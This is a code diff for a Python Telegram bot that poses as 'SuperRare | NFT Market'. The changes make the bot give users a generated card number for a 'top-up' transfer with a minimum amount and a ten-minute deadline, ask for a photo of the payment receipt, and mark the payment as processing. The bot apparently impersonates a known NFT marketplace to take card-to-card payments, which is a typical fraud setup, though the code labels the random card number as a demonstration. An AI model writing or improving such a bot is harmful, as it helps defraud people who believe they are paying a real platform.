@@ -25,9 +25,10 @@ def keep_alive():
             print(f"❌ Ошибка самопробуждения: {e}")
         time.sleep(600)
 
-# Запускаем самопробуждение
-keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
-keep_alive_thread.start()
+# Запускаем самопробуждение в отдельном потоке
+if os.environ.get('RENDER'):
+    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
+    keep_alive_thread.start()
 
 # ==================== ТЕКСТЫ ====================
 TEXTS = {
@@ -44,6 +45,7 @@ TEXTS = {
         "payment_created": "Создана заявка на оплату\n\nДля пополнения переведите указанную сумму по номеру карты.\n\n---\n\n✅ Карта: {card_number}\n✅ Сумма: {amount} {currency}\n\n---\n\n**Реквизиты действительны 10 минут.**",
         "send_receipt": "Просим направить фотографию квитанции об оплате.\n\nОбращаем внимание: отправка допускается исключительно в переписке с ботом.",
         "payment_cancelled": "Заявка на оплату отменена.",
+        "payment_received": "✅ Спасибо! Ваша заявка принята в обработку. Ожидайте подтверждения оплаты.",
         "personal_account_text": """**SuperRare | NFT Market**
 
 ---
@@ -88,6 +90,7 @@ TEXTS = {
         "payment_created": "Payment request created\n\nTo top up, transfer the specified amount to the card number.\n\n---\n\n✅ Card: {card_number}\n✅ Amount: {amount} {currency}\n\n---\n\n**Details are valid for 10 minutes.**",
         "send_receipt": "Please send a photo of the payment receipt.\n\nPlease note: sending is allowed only in correspondence with the bot.",
         "payment_cancelled": "Payment request cancelled.",
+        "payment_received": "✅ Thank you! Your application has been accepted for processing. Please wait for payment confirmation.",
         "personal_account_text": """**SuperRare | NFT Market**
 
 ---
@@ -247,13 +250,26 @@ def update_user_currency(user_id, currency):
     conn.close()
 
 def create_payment(user_id, amount, currency):
+    # Генерируем случайный номер карты для демонстрации
+    import random
+    card_number = '2200' + ''.join([str(random.randint(0, 9)) for _ in range(12)])
+    
     conn = sqlite3.connect('superrare.db', check_same_thread=False)
     cursor = conn.cursor()
-    cursor.execute('INSERT INTO payments (user_id, amount, currency, card_number) VALUES (?, ?, ?, ?)', (user_id, amount, currency, '[НОМЕР КАРТЫ ДЛЯ ОПЛАТЫ]'))
+    cursor.execute('INSERT INTO payments (user_id, amount, currency, card_number) VALUES (?, ?, ?, ?)', 
+                  (user_id, amount, currency, card_number))
     payment_id = cursor.lastrowid
     conn.commit()
     conn.close()
-    return payment_id
+    return payment_id, card_number
+
+def get_last_payment(user_id):
+    conn = sqlite3.connect('superrare.db', check_same_thread=False)
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM payments WHERE user_id = ? ORDER BY id DESC LIMIT 1', (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result
 
 # ==================== ОТПРАВКА СООБЩЕНИЙ ====================
 def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
@@ -280,12 +296,21 @@ def home():
 def webhook():
     try:
         update = request.get_json()
+        print(f"📥 Получено обновление: {update}")  # Логируем входящие данные
+        
         if 'message' in update:
             message = update['message']
             user_id = message["from"]["id"]
             text = message.get("text", "")
             username = message["from"].get("username", "")
             first_name = message["from"].get("first_name", "")
+            
+            # Проверяем, есть ли фото
+            photo = message.get('photo')
+            if photo:
+                # Обработка фотографии
+                handle_photo(user_id, photo, message.get('caption', ''))
+                return 'ok'
 
             user_data = get_user_data(user_id)
 
@@ -451,8 +476,8 @@ def webhook():
                             amount = float(text)
                             min_amount = 2500.0 if curr == 'RUB' else 50.0
                             if amount >= min_amount:
-                                create_payment(user_id, amount, curr)
-                                payment_text = text_obj["payment_created"].format(card_number="[НОМЕР КАРТЫ ДЛЯ ОПЛАТЫ]", amount=amount, currency=curr)
+                                payment_id, card_number = create_payment(user_id, amount, curr)
+                                payment_text = text_obj["payment_created"].format(card_number=card_number, amount=amount, currency=curr)
                                 update_user_state(user_id, 'payment_confirmation')
                                 send_message(user_id, payment_text, payment_confirmation_keyboard(lang))
                             else:
@@ -460,10 +485,62 @@ def webhook():
                         except ValueError:
                             send_message(user_id, "Пожалуйста, введите число")
 
+                elif state == 'payment_confirmation':
+                    text_obj = TEXTS[lang]
+                    paid_text = "Я оплатил(а) ✅" if lang == 'ru' else "I paid ✅"
+                    cancel_text = "Отменить" if lang == 'ru' else "Cancel"
+
+                    if text == paid_text:
+                        # Пользователь нажал "Я оплатил"
+                        update_user_state(user_id, 'waiting_receipt')
+                        send_message(user_id, text_obj["send_receipt"])
+                    elif text == cancel_text:
+                        update_user_state(user_id, 'personal_account')
+                        send_message(user_id, text_obj["payment_cancelled"], personal_account_keyboard(lang))
+
+                elif state == 'waiting_receipt':
+                    # В этом состоянии бот ждет фото, которое обрабатывается в handle_photo
+                    # Если пользователь отправил текст вместо фото
+                    if text:
+                        send_message(user_id, "Пожалуйста, отправьте фотографию квитанции об оплате")
+
         return 'ok'
     except Exception as e:
         print(f"❌ Ошибка в webhook: {e}")
         return 'error', 500
+
+def handle_photo(user_id, photo, caption=''):
+    """Обработка фотографии квитанции"""
+    try:
+        user_data = get_user_data(user_id)
+        if user_data:
+            state, db_username, language, currency = user_data
+            lang = language or 'ru'
+            text_obj = TEXTS[lang]
+            
+            if state == 'waiting_receipt':
+                # Получаем информацию о последнем платеже
+                last_payment = get_last_payment(user_id)
+                if last_payment:
+                    # Обновляем статус платежа
+                    conn = sqlite3.connect('superrare.db', check_same_thread=False)
+                    cursor = conn.cursor()
+                    cursor.execute('UPDATE payments SET status = ? WHERE id = ?', ('processing', last_payment[0]))
+                    conn.commit()
+                    conn.close()
+                    
+                    # Отправляем подтверждение
+                    send_message(user_id, text_obj["payment_received"])
+                    
+                    # Возвращаем в личный кабинет
+                    update_user_state(user_id, 'personal_account')
+                    send_message(user_id, text_obj["personal_account"], personal_account_keyboard(lang))
+                else:
+                    send_message(user_id, "Ошибка: не найдена информация о платеже")
+            else:
+                send_message(user_id, "Пожалуйста, следуйте инструкциям бота")
+    except Exception as e:
+        print(f"❌ Ошибка обработки фото: {e}")
 
 def set_webhook():
     try:
@@ -477,20 +554,19 @@ def set_webhook():
     except Exception as e:
         print(f"❌ Ошибка: {e}")
 
-# ==================== ЗАПУСК ДЛЯ PRODUCTION ====================
+# ==================== ЗАПУСК ====================
 def create_app():
     """Функция для Gunicorn"""
     init_db()
     set_webhook()
     return app
 
-# Инициализация при импорте (для Gunicorn)
+# Инициализация при импорте
 init_db()
 set_webhook()
 print("🚀 Бот инициализирован и готов к работе!")
 
 if __name__ == "__main__":
-    # Только для локальной разработки
     port = int(os.environ.get('PORT', 5000))
     print(f"📍 Локальный запуск на порту {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
